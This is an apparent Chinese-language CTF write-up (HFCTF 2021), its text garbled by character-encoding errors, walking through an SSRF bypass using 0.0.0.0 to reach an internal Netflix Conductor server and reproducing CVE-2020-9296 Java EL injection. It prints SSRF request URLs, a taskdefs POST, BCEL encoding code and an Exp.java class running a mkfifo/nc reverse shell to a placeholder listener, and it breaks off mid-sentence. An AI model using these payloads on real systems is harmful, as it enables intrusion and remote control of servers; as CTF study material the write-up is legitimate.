src="/img/2021hfctf/image-20210403192837797.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192837797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192837797"></p><p>å³å¯å¾—åˆ°æç¤ºï¼Œ</p><p>å¤§æ¦‚æ„æ€æ˜¯ä»–ä»¬åœ¨å†…ç½‘éƒ¨ç½²äº† netflix conductor æœåŠ¡å™¨ï¼Œè®©æˆ‘ä»¬ SSRF ä¸€ä¸‹ï¼Œè¿™é‡Œç†Ÿæ‚‰ docker çš„ <a href="https://guo.moe/">æœæœ</a> åŒå­¦è·Ÿæˆ‘è¯´é¢˜ç›®éƒ½æ˜¯ docker æ­å»ºçš„ï¼Œä¼šä¸ä¼šï¼Œï¼Œè¿™ä¸ª netflix æœåŠ¡ä¹Ÿæ˜¯ docker æ¥çš„å‘¢ï¼Ÿ</p><p><img src="/img/2021hfctf/image-20210403193312651.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193312651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193312651"></p><p><img src="/img/2021hfctf/image-20210403193452042.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193452042.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193452042"></p><p>è†œæ‹œ.jpg ï¼Œè‡³äºä¸ºä»€ä¹ˆçŸ¥é“æ˜¯ 8080 ç«¯å£ï¼Œæœä¸€ä¸‹ netflix å®˜æ–¹éƒ¨ç½²æ–‡æ¡£ï¼Œå°± 8080 å’Œ 5000 ä¸¤ä¸ªç«¯å£ã€‚</p><p>å½“ç„¶ï¼Œè¿™é‡Œè¿˜æœ‰å°å·®æ›²ï¼Œæˆ‘ä¸€å¼€å§‹æš´åŠ›ç ´è§£ï¼Œï¼Œå†…ç½‘ip å’Œ ç«¯å£ï¼Œç›´æ¥æŠŠå®ƒç»™å¼„å®•æœºäº†ã€‚ã€‚ã€‚</p><p>æºç æœ‰ç‚¹é•¿ï¼Œæå–å…³é”®éƒ¨åˆ†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.swaggerUi = <span class="keyword">new</span> SwaggerUi(&#123;</span><br><span class="line">                  url: url + <span class="string">&quot;/api/swagger.json&quot;</span>,</span><br><span class="line">                  dom_id: <span class="string">&quot;swagger-ui-container&quot;</span>,</span><br><span class="line">                  supportedSubmitMethods: [<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;patch&#x27;</span>],</span><br><span class="line">                  onComplete: <span class="function"><span class="keyword">function</span>(<span class="params">swaggerApi, swaggerUi</span>)</span>&#123;</span><br><span class="line">                      <span class="built_in">window</span>.swaggerUi.api.setBasePath(<span class="string">&quot;/api&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span>(<span class="keyword">typeof</span> initOAuth == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                          initOAuth(&#123;</span><br><span class="line">                              clientId: <span class="string">&quot;your-client-id&quot;</span>,</span><br><span class="line">                              clientSecret: <span class="string">&quot;your-client-secret-if-required&quot;</span>,</span><br><span class="line">                              realm: <span class="string">&quot;your-realms&quot;</span>,</span><br><span class="line">                              appName: <span class="string">&quot;your-app-name&quot;</span>,</span><br><span class="line">                              scopeSeparator: <span class="string">&quot; &quot;</span>,</span><br><span class="line">                              additionalQueryStringParams: &#123;&#125;</span><br><span class="line">                          &#125;);</span><br><span class="line">                      &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>è®¿é—®è¿™ä¸ª json æ–‡ä»¶</p><p><img src="/img/2021hfctf/image-20210403193726603.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193726603.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193726603"></p><p>ç„¶ååˆ°è¿™å°±å¡ä½äº†</p><p>ç½‘ä¸Šæœäº†ä¸€ä¸‹ CVEï¼Œ <a href="https://xz.aliyun.com/t/7889">https://xz.aliyun.com/t/7889</a> æ¯•ç«Ÿ  SSRF å¸¸è§éƒ½æ˜¯å’Œ Redis ä¹‹ç±»çš„çš„ï¼Œä¸€èˆ¬éƒ½æ˜¯å…¬å¼€æ¼æ´ï¼Œç„¶åæ¥å£å¥½åƒä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®</p><p><img src="/img/2021hfctf/image-20210403193837506.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193837506.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193837506"></p><p>æ­£æ‰“ç®—çœ‹çœ‹èƒ½ä¸èƒ½ CRLF å•¥çš„ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‘é€ POST è¯·æ±‚è¿‡å»åˆ©ç”¨ CVEï¼Œä½†çªç„¶å°±è®¿é—®ä¸äº†äº†ï¼Œï¼Œï¼Œ</p><p><img src="/img/2021hfctf/image-20210403193944899.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193944899.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193944899"></p><p>ä¸çŸ¥é“æ€è·¯æ˜¯ä¸æ˜¯è·‘åäº†ï¼Œç„¶åè¢«ä¸¾åŠæ–¹ç»™çœ‹åˆ°äº† ï¼Œå°±ç›´æ¥å¡äº†ï¼Œç„¶åå°±æ²¡å•¥æ—¶é—´äº†ï¼Œä¹Ÿæ²¡æ¥å¾—åŠè¯•å…¶ä»–çš„ï¼Œåç­‰ wpï¼Œæˆ‘å¾ˆå¥½å¥‡.jpg</p><hr><p>4æœˆ22æ—¥æ›´</p><p>å¥½äº†ï¼ŒåŸæ¥æ€è·¯æ²¡æœ‰è·‘åï¼Œæˆ‘ä»¬ç»§ç»­ï¼ˆåˆšè‚å®Œè®ºæ–‡</p><p>ä¸è¿‡åœ¨ buu çš„å¤ç°ç¯å¢ƒé‡Œç›´æ¥ç»™å‡ºäº†netflix çš„å†…ç½‘ipï¼Œä¸ç”¨æˆ‘ä»¬çŒœdockerç½‘æ®µç„¶åçˆ†ç ´ï¼Œæˆ‘ä»¬ç›´æ¥fuzzä¸‹å›¾3ä¸ªç½‘æ®µ 8080ç«¯å£å³å¯</p><p><img src="/img/2021hfctf/image-20210422145443361.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422145443361.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422145443361"></p><p>æœ€è¿‘åˆ·äº†ä¸€äº›SSRFé¢˜ï¼Œå‘ç°è¿˜å¯ä»¥ç”¨ 0.0.0.0 çš„æ–¹å¼å»ç»•è¿‡ IP é™åˆ¶ï¼Œè®¿é—® 0.0.0.0 é»˜è®¤æ˜¯è§£æåˆ°æœ¬æœºä¸Šçš„ï¼Œç„¶åæ°å¥½ nodejs çš„ <code>IP.isPublic(host)</code> å‡½æ•°ä¼šæŠŠä»–è§†ä¸ºå…¬ç½‘IPã€‚</p><p>æ³¨æ„fuzzçº¿ç¨‹ä¸èƒ½å¤ªé«˜ï¼Œä¸ç„¶æœåŠ¡å®¹æ˜“å´©ï¼Œæœ€ç»ˆå‘ç°netflixåœ¨ 10.0.219.14:8080</p><p><img src="/img/2021hfctf/image-20210422160555844.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422160555844.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422160555844"></p><p>ç°åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰å¤šä¸ªçš„æ¼æ´ï¼Œæ‰€ä»¥å…ˆç¡®è®¤ä¸€ä¸‹ netflix çš„ç‰ˆæœ¬ï¼Œ</p><p>å…ˆè¯·æ±‚ä¸€ä¸‹æ ¹è·¯å¾„å‘ç°æºç æœ‰ä¸­æš´éœ²çš„apiè·¯å¾„ </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080</span><br></pre></td></tr></table></figure><p>è¯·æ±‚ä¸€ä¸‹ä¼šè¿”å›jsonæ ¼å¼å†…å®¹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/swagger.json</span><br></pre></td></tr></table></figure><p>å¤åˆ¶json æ ¼å¼åŒ–ä¸€ä¸‹å‘ç° admin config å°±åœ¨ç¬¬ä¸€å¤„ï¼Œï¼Œ</p><p><img src="/img/2021hfctf/image-20210422152257725.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422152257725.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422152257725"></p><p>è¯·æ±‚ä¸€ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.219.14:8080/api/admin/config</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210422153043013.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422153043013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422153043013"></p><p>å‘ç° netflix ç‰ˆæœ¬ä¸º 2.26.0ï¼Œç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œåªå‘ç° <a href="https://snyk.io/vuln/maven:com.netflix.conductor%3Aconductor-core">2.25.3</a> ç‰ˆæœ¬çš„æ¼æ´</p><p>çœ‹äº†ä¸€ä¸‹ <a href="https://github.com/Netflix/conductor/pull/1543/commits/375f8d8b708a801647c327e0848b30d34f804edd">commit</a> è®°å½•ï¼Œå‘ç°è¿™ä¸ªç‰ˆæœ¬å·²ç»ä¿®äº†çš„</p><p><img src="/img/2021hfctf/image-20210422153724132.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422153724132.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422153724132"></p><p>çœ‹äº†ä¸€ä¸‹å¤§ä½¬çš„å¤ç°ï¼Œå‘ç°æ€è·¯æ˜¯å¯¹äº†ï¼ŒCRLF POST åˆ©ç”¨ netflix çš„ CVE</p><p><a href="https://xz.aliyun.com/t/9423">https://xz.aliyun.com/t/9423</a></p><p><a href="https://www.zhaoj.in/read-6905.html">https://www.zhaoj.in/read-6905.html</a></p><p>ç»è¿‡è¿™æ¬¡æ¯”èµ›ï¼Œå‘ç°ï¼Œæœ‰æ—¶å€™ç‰ˆæœ¬ä¸å¯¹å°±å…ˆè¯•è¯•ä¸´è¿‘ç‰ˆæœ¬ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ­»é©¬å½“æ´»é©¬åŒ» ï¼ˆ</p><p>é¦–å…ˆè¦å¤ç° CVE-2020-9296ï¼Œå…ˆä¿è¯åœ¨æœ¬åœ°èƒ½æ­£å¸¸åˆ©ç”¨ã€‚</p><h3 id="CVE-2020-9296-å¤ç°"><a href="#CVE-2020-9296-å¤ç°" class="headerlink" title="CVE-2020-9296 å¤ç°"></a>CVE-2020-9296 å¤ç°</h3><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>å…ˆæ­å»ºä¸€ä¸‹ç¯å¢ƒï¼Œå¤ç°ä¸€ä¸‹</p><p>å›åˆ°ä¸Šé¢çš„ <a href="https://xz.aliyun.com/t/7889">https://xz.aliyun.com/t/7889</a> é“¾æ¥</p><blockquote><p>Netflix Conductor uses Java Bean Validation (JSR 380) custom constraint validators. When building custom constraint violation error messages, different types of interpolation are supported, including Java EL expressions. If an attacker can inject arbitrary data in the error message template being passed to ConstraintValidatorContext.buildConstraintViolationWithTemplate() argument, they will be able to run arbitrary Java code.</p><p>æœ¬æ¬¡æ¼æ´æˆå› åœ¨äºè‡ªå®šä¹‰çº¦æŸå†²çªæ—¶çš„é”™è¯¯ä¿¡æ¯æ”¯æŒäº† Java EL è¡¨è¾¾å¼ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶ConstraintValidatorContext.buildConstraintViolationWithTemplate() å‡½æ•°çš„å‚æ•°ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡æ³¨å…¥ Java EL è¡¨è¾¾å¼è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚</p></blockquote><p>æºç ä»£ç ä¸‹è½½ï¼š<a href="https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0">https://codeload.github.com/Netflix/conductor/zip/refs/tags/v2.25.0</a></p><p>å…¨å±€æœä¸€ä¸‹ <code>buildConstraintViolationWithTemplate(</code> å‘ç°å¤šå¤„æœ‰ç”¨åˆ°ï¼Œå¹¶ä¸”å‚æ•°åˆ©ç”¨ <code>String.format(0)</code> ç”Ÿæˆçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¼å¼åŒ–è¿‡ç¨‹ä¸­å­˜åœ¨ç”¨æˆ·å¯æ§çš„å˜é‡ <code>taskDef.getName()</code> è‡³äºæ€ä¹ˆå‘ç°çš„ <code>TaskTimeoutConstraint.java</code> æ–‡ä»¶å­˜åœ¨å¯åˆ©ç”¨ç‚¹ï¼Œå¯èƒ½æ’æŸ¥èµ·æ¥å°±éœ€è¦äº›æ—¶é—´å’Œè€å¿ƒäº†ï¼Œè¿™é‡Œè·Ÿç€æ¥å…ˆã€‚</p><p><img src="/img/2021hfctf/image-20210422185124957.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422185124957.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422185124957"></p><p>ä¸‹ä¸€æ­¥ç»§ç»­å…³æ³¨ <code>TaskTimeoutConstraint.java</code> åœ¨å“ªè¢«ä½¿ç”¨ï¼Œå®šä½åˆ° <code>common/src/main/java/com/netflix/conductor/common/metadata/tasks/TaskDef.java</code> æ–‡ä»¶ï¼Œå…¶å®ä¹Ÿæœ‰å¤šå¤„å¼•ç”¨ï¼Œã€‚æ‰¾æ¼æ´åˆ©ç”¨ç‚¹çš„å¤§ä½¬è¾›è‹¦äº†~</p><p><img src="/img/2021hfctf/image-20210422185744001.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422185744001.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422185744001"></p><p>å¯ä»¥çœ‹åˆ° <code>TaskTimeoutConstraint</code> æ³¨è§£åˆ°äº† <code>TaskDef</code> ç±»ä¸Šï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥è¿›è¡Œçœ‹ <code>TaskDef</code> ç±»ä¼šåœ¨å“ªé‡Œè¢«ä½¿ç”¨ï¼Œç»§ç»­æœç´¢å…¨å±€å¼•ç”¨ï¼Œå¯ä»¥çœ‹åˆ° <code>jersey/src/main/java/com/netflix/conductor/server/resources/MetadataResource.java</code> ä¼š<br>æŠŠè¯¥ç±»å’Œè·¯ç”± <code>/api/metadata/taskdefs</code> ç»‘å®šï¼Œå³æˆ‘ä»¬é€šè¿‡è¯·æ±‚è¯¥è·¯ç”±ï¼Œå³å¯è·å¾— <code>TaskDef</code> å¯¹è±¡ã€‚</p><p><img src="/img/2021hfctf/image-20210422190049360.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210422190049360.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210422190049360"></p><p><a href="https://netflix.github.io/conductor/labs/beginner/">https://netflix.github.io/conductor/labs/beginner/</a></p><p>å®˜æ–¹ç»™å‡ºçš„è®¿é—® API ç¨å¾®ä¿®æ”¹åå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  http://localhost:8080/api/metadata/taskdefs \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;verify_if_idents_are_added&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryCount&quot;: 3,</span></span><br><span class="line"><span class="string">      &quot;retryLogic&quot;: &quot;FIXED&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryDelaySeconds&quot;: 10,</span></span><br><span class="line"><span class="string">      &quot;timeoutSeconds&quot;: 180,</span></span><br><span class="line"><span class="string">      &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,</span></span><br><span class="line"><span class="string">      &quot;responseTimeoutSeconds&quot;: 300,</span></span><br><span class="line"><span class="string">      &quot;ownerEmail&quot;: &quot;type your email here&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">]&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ¼æ´æœ€ç»ˆçš„åˆ©ç”¨é€»è¾‘å¦‚ä¸‹ï¼š</p><ol><li>é€šè¿‡ POST è¯·æ±‚è®¿é—® URL <code>/api/metadata/taskdefs</code> åˆ›å»º <code>TaskDef</code> å¯¹è±¡</li><li>æ ¹æ®å®˜æ–¹APIç»™å‡ºçš„demoç¨å¾®ä¿®æ”¹åï¼Œå‚æ•°ä¸­çš„ <code>timeoutSeconds</code> å’Œ <code>responseTimeoutSeconds</code> æ»¡è¶³äº† <code>taskDef.getTimeoutSeconds() &gt; 0</code> ä»¥åŠ <code>taskDef.getResponseTimeoutSeconds() &gt; taskDef.getTimeoutSeconds()</code> è¿™ä¸¤ä¸ªæ¡ä»¶ï¼Œ<code>TaskTimeoutValidator</code> æ ¡éªŒå¤±è´¥ï¼Œ<code>TaskDef</code> çš„ <code>name</code> å±æ€§ä½œä¸ºé”™è¯¯ä¿¡æ¯çš„ä¸€éƒ¨åˆ†é€šè¿‡ <code>buildConstraintViolationWithTemplate(0)</code> è¾“å‡º</li><li>ç”±äº <code>name</code> æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ Java EL è¡¨è¾¾å¼ï¼Œæ‰€ä»¥æœ€åè¯¥è¡¨è¾¾å¼ä¼šè¢«æ‰§è¡Œï¼Œè¿›è€ŒæˆåŠŸè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œ</li></ol><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>è¿˜è‡ªå¸¦ docker-compose.yaml ä¹Ÿå¤ªè´´å¿ƒäº†å§ ï¼ˆ</p><p>ç”±äºåˆšåˆšä¸‹è½½çš„å°±æ˜¯2.25.0ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç›´æ¥åˆ‡åˆ° docker ç›®å½•ï¼Œåœ¨ up ä¸€ä¸‹å°±å¥½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> docker</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>å¦‚æœæœŸé—´æœ‰ä¸‹è½½é”™è¯¯å•¥çš„ï¼Œå¯ä»¥å°è¯•ä»£ç†æˆ–è€… up å¤šå‡ ä¸‹ã€‚</p><h5 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h5><p>æ— è®ºä¸‹é¢æ˜¯è‡ªå·±å†™ BCEL è¿˜æ˜¯ ç›´æ¥ç”¨ç°æœ‰çš„å·¥å…·ï¼Œéƒ½è¦æ³¨æ„ Javaçš„ç‰ˆæœ¬ï¼Œæˆ‘æœ¬åœ°ç”¨çš„æ˜¯ 1.8.0_144 ç‰ˆæœ¬ã€‚</p><p>è¿™é‡Œè¿˜ç¯‡æœ‰è¶£çš„æ–‡ç« ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoaderå»å“ªäº†</a> ï¼Œæˆ‘æ„Ÿè§‰å’Œè¿™ä¸ªæœ‰å…³ï¼Œ2333</p><p>æ®ç½‘ä¸Šçœ‹ï¼Œå¥½åƒä¿è¯ Java ç‰ˆæœ¬ &lt; Java 8u261 å³å¯ã€‚</p><h5 id="è‡ªå·±å†™ä¸€ä¸ªï¼Œç†Ÿæ‚‰ä¸€ä¸‹BCEL"><a href="#è‡ªå·±å†™ä¸€ä¸ªï¼Œç†Ÿæ‚‰ä¸€ä¸‹BCEL" class="headerlink" title="è‡ªå·±å†™ä¸€ä¸ªï¼Œç†Ÿæ‚‰ä¸€ä¸‹BCEL"></a>è‡ªå·±å†™ä¸€ä¸ªï¼Œç†Ÿæ‚‰ä¸€ä¸‹BCEL</h5><p>ä¾èµ–ä¸‹è½½åœ°å€ï¼š</p><p><a href="https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/">https://jar-download.com/artifacts/org.apache.servicemix.bundles/org.apache.servicemix.bundles.jaxp-ri/1.4.5_1/</a></p><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JavaClass cls = Repository.lookupClass(Exp.class);</span><br><span class="line">        String code = Utility.encode(cls.getBytes(), <span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ç›‘å¬IP&gt; &lt;ç›‘å¬ç«¯å£&gt; &gt;/tmp/f&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªPOCæˆ‘åœ¨æœ¬æœºå¯ä»¥æ‰“æˆåŠŸï¼Œä½†æ˜¯é€šè¿‡ curl æ‰“å®é™…dockerç¯å¢ƒ shell å°±åå¼¹ä¸å›æ¥ï¼Œç„¶åä¹Ÿè¯•äº†å„ç§æ–¹æ³• sh 